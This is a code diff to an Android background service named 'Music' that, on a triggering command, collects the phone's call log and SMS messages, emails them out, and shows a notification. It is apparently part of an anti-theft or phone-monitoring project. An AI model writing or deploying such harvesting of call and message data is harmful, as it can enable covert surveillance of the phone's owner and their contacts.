@@ -52,13 +52,13 @@ public class Music extends Service {
             id=0;
         }
         else if (nhankey.equals("send")){
-            check=1;
+            id = -1;
         }
 
         if(id==1) {
-            //mediaPlayer = MediaPlayer.create(this, R.raw.man);
+            mediaPlayer = MediaPlayer.create(this, R.raw.man);
 
-            //mediaPlayer.start();
+            mediaPlayer.start();
 
             String results = getCallDetails();
             String r2 = getSmsDetails();
@@ -67,11 +67,14 @@ public class Music extends Service {
             sendEmail(rs);
             displayNotification("Alarm!!!");
             vibrator.vibrate(2000);
-            id=0;
+            id=-2;
 
         }
-
-        if(check==1) {
+        else if (id==0) {
+            mediaPlayer.stop();
+            id=-2;
+        }
+        else if(id == -1) {
             //mediaPlayer = MediaPlayer.create(this, R.raw.man);
 
             //mediaPlayer.start();
@@ -79,11 +82,12 @@ public class Music extends Service {
             String results = getCallDetails();
             String r2 = getSmsDetails();
             String rs = results + r2;
+            Log.e("Collected: ", "Done");
             //saveTextAsFile(rs);
             sendEmail(rs);
             displayNotification("Collected");
             vibrator.vibrate(2000);
-            check=0;
+            id=-2;
 
         }
 
